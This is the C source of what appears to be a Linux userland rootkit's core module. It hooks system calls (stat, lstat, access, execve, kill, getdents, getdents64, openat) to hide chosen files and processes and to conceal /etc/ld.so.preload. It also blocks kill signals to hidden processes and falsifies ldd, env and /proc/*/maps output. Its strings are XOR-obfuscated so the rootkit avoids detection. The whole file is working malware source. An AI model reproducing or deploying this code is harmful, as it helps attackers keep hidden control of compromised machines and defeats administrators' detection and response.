/* 
    Main rootkit functionality and syscall hooks
*/
#define _GNU_SOURCE
#define _LARGEFILE_SOURCE 1
#include <stdio.h> 
#include <errno.h> 
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <fnmatch.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define DEBUG
#define BUF_SIZE 8192
#include "utils/clean.c"
#include "utils/xor.c"
#include "rk.h"
#include "utils/fd2fname.c"
#include "utils/is_hidden.c"
#include "utils/is_rk_user.c"
#include "utils/pid2pname.c"
#include "stealth/hide_ldd.c"
#include "stealth/hide_env.c"
#include "stealth/install_rk.c"
#include "stealth/hide_maps.c"
#include "rkconsts.h"

typedef long (*syscall_fn_t)(long, long, long, long, long, long, long);

static syscall_fn_t next_sys_call = NULL;

struct linux_dirent64 {
    ino64_t        d_ino;    /* 64-bit inode number */
    off64_t        d_off;    /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char  d_type;   /* File type */
    char           d_name[]; /* Filename (null-terminated) */
};

struct linux_dirent {
    long           d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};

static long rk_hook(long a1, long a2, long a3,
			  long a4, long a5, long a6,
			  long a7)
{
    // DEBUG_MSG("rax_stack=%ld rdi=%ld rsi=%ld rdx=%ld r10_stack=%ld r8=%ld r9=%ld\n", a1, a2, a3, a4, a5, a6, a7);
    switch(a1) {
        // case 0: {
        //     // ssize_t read(int fd, void *buf, size_t count);
        //     if (is_rk_user()) break;
        //     DEBUG_MSG("[-] read hooked!\n")
        //     char path[256];
        //     int fd = (int)a2;
        //     fd_to_fname(fd, path, sizeof(path));
        //     if (check_if_hidden_path(path)) {
        //         DEBUG_MSG("[!] Hiding file %s from read\n", path);
        //         return -1;
        //     }
        //     break;
        // }
        // case 1: {
        //     // ssize_t write(int fd, const void *buf, size_
        //     if (is_rk_user()) break;
        //     DEBUG_MSG("[-] write hooked!\n");
        //     char path[256];
        //     int fd = (int)a2;
        //     fd_to_fname(fd, path, sizeof(path));
        //     if (check_if_hidden_path(path)) {
        //         DEBUG_MSG("[!] Hiding file %s from wrute\n", path);
        //         return -1;
        //     }
        //     break;
        // }
        // case SYS_OPEN: {
        //     // int open(const char *pathname, int flags);
        //     if (is_rk_user()) break;
        //     DEBUG_MSG("[-] open hooked!\n");
        //     const char *path = (const char *)a2;
        //     if (check_if_hidden_path(path)) {
        //         DEBUG_MSG("[!] Hiding file %s from open\n", path);
        //         return -ENOENT;
        //     }
        //     break;
        // }
        // case SYS_CLOSE: {
        //     // int close(int fd);
        //     if (is_rk_user()) break;
        //     DEBUG_MSG("[-] close hooked!\n");
        //     int fd;
        //     char path[256];
        //     fd = (int)a2;
        //     fd_to_fname(fd, path, sizeof(path));
        //     if (check_if_hidden_path(path)) {
        //         DEBUG_MSG("[!] Hiding file %s from close\n", path);
        //         return -1;
        //     }
        //     break;
        // }
        case SYS_STAT: {
            // int stat(const char *path, struct stat *buf);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] stat hooked!\n");
            const char *path = (const char *)a2;
            if (check_if_hidden_str(path)) {
                DEBUG_MSG("[!] Hiding file %s from stat\n", path);
                return -ENOENT;
            }
            break;
        }
        case SYS_FSTAT: {
            // int fstat(int fd, struct stat *statbuf);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] fstat hooked!\n");
            int fd;
            char path[256];
            fd = (int)a2;
            fd_to_fname(fd, path, sizeof(path));             
            if (check_if_hidden_str(path)) {
                DEBUG_MSG("[!] Hiding file %s from fstat\n", path);
                return -ENOENT;
            }
            break;  
        }
        case SYS_LSTAT: {
            // int lstat(const char *path, struct stat *buf); 
            if (is_rk_user()) break;
            DEBUG_MSG("[-] lstat hooked!\n");
            char *path = (char *)a2;
            if (check_if_hidden_str(path)) {
                DEBUG_MSG("[!] Hiding file %s from lstat\n", path);
                return -ENOENT;
            }
            break;
        }
        case SYS_ACCESS: {
            // int access(const char *pathname, int mode);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] access hooked!\n");
            char *path = (char *)a2;
            if (check_if_hidden_str(path)) {
                DEBUG_MSG("[!] Hiding file %s from access\n", path);
                return -ENOENT;
            }
            break;
        }
        case SYS_EXECVE: {
            // int execve(const char *filename, char *const argv[], char *const envp[]);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] execve hooked!\n");
            char *filename = (char *)a2;
            char **argv = (char **)a3;
            char **envp = (char **)a4;
            char *ld_linux_so = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so);
            char *env = strdup(ENV_PATH); xor(env);
            DEBUG_MSG("[-] Executing %s\n", filename);
            // DEBUG_MSG("[-] %s\n", ld_linux_so);
            // DEBUG_MSG("[-] %d\n", fnmatch(filename, ld_linux_so, FNM_NOESCAPE));
            int i = 0;
            // while (argv[i] != NULL) {
            //     DEBUG_MSG("argv: %s\n", argv[i]);
            //     i++;
            // }
            // i = 0;
            // while (envp[i] != NULL) {
            //     DEBUG_MSG("envp: %s\n", envp[i]);
            //     i++;
            // }
            // i = 0;
            
            /* BAD CODE, REVAMP LATER */
            // check if we are calling ldd
            if (!strcmp(ld_linux_so, filename)) {
                CLEAN(ld_linux_so);
                // We have a call to ldd
                DEBUG_MSG("[-] Detected call to ldd\n");
                char *ld_trace_env_var = strdup(LD_TRACE_ENV_VAR); xor(ld_trace_env_var);
                // Check for LD_TRACE_LOADED_OBJECTS=1
                while (envp[i] != NULL) {
                    if (strstr(envp[i], ld_trace_env_var) != NULL) {
                        DEBUG_MSG("[-] Detected LD_TRACE_ENV_VAR=1\n");
                        CLEAN(ld_trace_env_var);
                        hide_ldd(argv);
                    }
                    i++;
                }
                CLEAN(ld_trace_env_var);
                break;
            }
            // check if we are calling env command
            else if (strstr(filename, env) != NULL) {
                CLEAN(ld_linux_so);
                CLEAN(env);
                // we have a call to env
                DEBUG_MSG("[-] Detected call to env\n");
                hide_exec_env(argv, envp);
            }
            break;
        }
        case SYS_KILL: {
            // int kill(pid_t pid, int sig)
            if (is_rk_user()) break;
            DEBUG_MSG("[-] kill hooked!\n");
            
            // convert pid to string
            pid_t pid = (pid_t)a2;
            char pid_str[20];
            char proc_name[4096];
            sprintf(pid_str, "%d", pid);
            pid_to_pname(pid_str, proc_name);
            if (check_if_hidden_str(pid_str)) {
                DEBUG_MSG("[!] Intercepting kill syscall to %s\n", proc_name);
                // oh noo haha u got me
                return -ENOENT;
            }            
            break;
        }
        // i think this is only needed for armbian64, not sure
        case SYS_GETDENTS: {
            // int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] getdents hooked!\n");
            char tmpbuf[BUF_SIZE];
            int nread;
            int fd = (int)a2;
            struct linux_dirent *dirp = (struct linux_dirent *)a3;
            int valid_len = 0;

            // Check if we are in /proc or not
            char fname[256];
            fd_to_fname(fd, fname, sizeof(fname));
            int in_proc = 0;
            // TODO: xor this string out later
            if (strcmp(fname, "/proc") == 0) {
                in_proc = 1;
            }
            while (1) {
                nread = syscall(SYS_getdents, fd, tmpbuf, BUF_SIZE); 
                if (nread == -1) {
                    // Handle error
                }
                if (nread == 0) {
                    break; // No more entries
                }

                for (int bpos = 0, valid_pos = 0; bpos < nread;) {
                    struct linux_dirent *d, *valid_d; 
                    d = (struct linux_dirent *)(tmpbuf + bpos);
                    // DEBUG_MSG("%s\n", d->d_name);
                    if (in_proc == 1) {
                        char proc_name[256];
                        pid_to_pname(d->d_name, proc_name);
                        if (check_if_hidden_str(proc_name)) {
                            DEBUG_MSG("[!] Hiding procs %s from getdents\n", proc_name);
                            bpos += d->d_reclen;
                            continue;
                        }
                    }
                    else {
                        if (check_if_hidden_str(d->d_name)) {
                            DEBUG_MSG("[!] Hiding file %s from getdents\n", d->d_name);
                            bpos += d->d_reclen;
                            continue; // Skip entry
                        }
                    }
                    // Calculate the length of the valid entries
                    valid_len += d->d_reclen;

                    // If hiding files, we need to move valid entries up in the buffer
                    if (bpos != valid_pos) {
                        valid_d = (struct linux_dirent *)(tmpbuf + valid_pos);
                        memcpy(valid_d, d, d->d_reclen);
                    }

                    valid_pos += d->d_reclen;
                    bpos += d->d_reclen;
                }
            }
            memcpy(dirp, tmpbuf, valid_len);
            return valid_len;      
        }
        case SYS_GETDENTS64: {
            // int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] getdents64 hooked!\n");
            char tmpbuf[BUF_SIZE];
            int nread;
            int fd = (int)a2;
            struct linux_dirent64 *dirp = (struct linux_dirent64 *)a3;
            int valid_len = 0;

            // Check if we are in /proc or not
            char fname[4096];
            fd_to_fname(fd, fname, sizeof(fname));
            int in_proc = 0;
            // TODO: xor this string out later
            if (strcmp(fname, "/proc") == 0) {
                in_proc = 1;
                DEBUG_MSG("[?] Inside /proc!\n")
            }
        
            char *ld_so_preload = strdup(LD_SO_PRELOAD); xor(ld_so_preload);
            // struct linux_dirent64 {
            //     ino64_t        d_ino;    /* 64-bit inode number */
            //     off64_t        d_off;    /* 64-bit offset to next structure */
            //     unsigned short d_reclen; /* Size of this dirent */
            //     unsigned char  d_type;   /* File type */
            //     char           d_name[]; /* Filename (null-terminated) */
            // };

            while (1) {
                nread = syscall(SYS_getdents64, fd, tmpbuf, BUF_SIZE); 
                if (nread == -1) {
                    // Handle error
                    break;
                }
                if (nread == 0) {
                    break; // No more entries
                }

                for (int bpos = 0, valid_pos = 0; bpos < nread;) {
                    struct linux_dirent64 *d, *valid_d; 
                    d = (struct linux_dirent64 *)(tmpbuf + bpos);
                    if (in_proc == 1) {
                        char proc_name[4096];
                        if (strspn(d->d_name, "0123456789") != strlen(d->d_name)) {
                            DEBUG_MSG("Not calling pid_to_pname() on %s\n", d->d_name);
                            memcpy(proc_name, d->d_name, strlen(d->d_name));
                        }
                        else {
                            DEBUG_MSG("Calling pid_to_pname()\n");
                            pid_to_pname(d->d_name, proc_name);
                            DEBUG_MSG("%s -> %s\n", d->d_name, proc_name);
                        }
                        if (check_if_hidden_str(proc_name)) {
                            DEBUG_MSG("[!] Hiding process %s from getdents64\n", d->d_name);
                            bpos += d->d_reclen;
                            continue;
                        }
                    }
                    else {
                        if (check_if_hidden_str(d->d_name)) {
                            DEBUG_MSG("[!] Hiding file %s from getdents64\n", d->d_name);
                            bpos += d->d_reclen;
                            continue; // Skip entry
                        }
                        else if ((!has_backup_ld_so_preload()) && (!strcmp(d->d_name, ld_so_preload))) {
                            DEBUG_MSG("[!] Hiding /etc/ld.so.preload\n");
                            bpos += d->d_reclen;
                            continue;
                        }
                    }
                    // Calculate the length of the valid entries
                    valid_len += d->d_reclen;

                    // If hiding files, we need to move valid entries up in the buffer
                    if (bpos != valid_pos) {
                        valid_d = (struct linux_dirent64 *)(tmpbuf + valid_pos);
                        memcpy(valid_d, d, d->d_reclen);
                    }
                    valid_pos += d->d_reclen;
                    bpos += d->d_reclen;
                }
            }
            CLEAN(ld_so_preload);
            memcpy(dirp, tmpbuf, valid_len);
            return valid_len;
        }
        case SYS_OPENAT: {
            //  int openat(int fd, const char *path, int oflag, ...);
            if (is_rk_user()) break;
            DEBUG_MSG("[-] openat hooked!\n");
            char *path = (char *)a3;
            DEBUG_MSG("[-] Attempting to open %s\n", path);
            if (check_if_hidden_str(path)) {
                DEBUG_MSG("[!] Hiding file %s\n", path);
                return -ENOENT;
            };
            // probably need to xor this out 
            if (!fnmatch("/proc/*/maps", path, FNM_PATHNAME)) {
                DEBUG_MSG("[!] Hiding from /proc/*/maps\n");
                return hide_maps(path);
            }
            char *ld = strdup(LD_SO_PRELOAD_PATH); xor(ld);
            if (!strcmp(path, ld)) {
               // TODO: Return backup if /etc/ld.so.preload already existed 
               // prior to installing rootkit 
                CLEAN(ld);
                return -ENOENT;
            }
            CLEAN(ld);
            break;
        }
        default: 
            // DEBUG_MSG("output from hook_function: syscall number %ld\n", a1);
            ;
    }
    // DEBUG_MSG("Returning next_sys_call %d\n", a1);    
	return next_sys_call(a1, a2, a3, a4, a5, a6, a7);
}


int __hook_init(long placeholder __attribute__((unused)),
		void *sys_call_hook_ptr)
{
	DEBUG_MSG("[-] __hook_init loaded \n");
	next_sys_call = *((syscall_fn_t *) sys_call_hook_ptr);
	*((syscall_fn_t *) sys_call_hook_ptr) = rk_hook;

	return 0;
}
